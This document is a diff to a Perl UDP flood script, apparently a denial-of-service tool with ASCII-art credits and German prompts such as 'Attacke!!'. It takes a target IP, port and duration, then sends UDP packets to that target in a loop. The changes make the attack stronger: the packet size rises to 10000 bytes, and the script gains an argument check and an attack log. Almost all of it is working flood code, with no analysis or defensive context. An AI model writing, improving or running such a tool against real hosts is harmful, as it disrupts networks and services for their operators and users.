@@ -18,7 +18,7 @@ my $desenho = <<'ASCII';
 ϟ (                    /                       /  \   ϟ
 ϟ                     (,                      '----`  ϟ
 ϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟ
-
+by:kyr1o5 the leper
 
 
 ASCII
@@ -34,19 +34,22 @@ GetOptions(
     'port=i' => \$port,
     'time=i' => \$time,
 );
+
+die "Usage: $0 --ip <target_ip> --port <target_port> --time <attack_time>\n"
+  unless $ip && $port && $time;
+
 print($desenho);
 print('Attacke!!');
 
 my ($iaddr, $endtime, $psize,$pport);
 
-$iaddr = inet_aton("$ip") or die "Der Hostname konnte nicht aufgelöst werden. Bitte versuchen Sie es erneut $ip\n";
-$endtime = time() + ($time ? $time : 1000000);
+$iaddr = inet_aton($ip) or die "Der Hostname konnte nicht aufgelöst werden. Bitte versuchen Sie es erneut $ip\n";
+$endtime = Time::HiRes::time() + $time;
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
-my $size = 700;
+my $size = 10000;
 
-($size ? "$size-byte" : "") . " " . ($time ? "" : "") . "\033[1;32m\033[0m\n\n";
-print "Drücken Sie STRG+C, um den Angriff zu stoppen";
+print "Drücken Sie STRG+C, um den Angriff zu stoppen\n";
 
 for (; Time::HiRes::time() <= $endtime; ) {
     $psize = $size ? $size : int(rand(1024 - 64) + 64);
@@ -54,3 +57,7 @@ for (; Time::HiRes::time() <= $endtime; ) {
 
     send(flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
 }
+
+open(my $log, '>>', 'attack_log.txt') or die "Die Protokolldatei kann nicht geöffnet werden: $!";
+print $log "Der Angriff endete em ", scalar localtime, "\n";
+close $log;
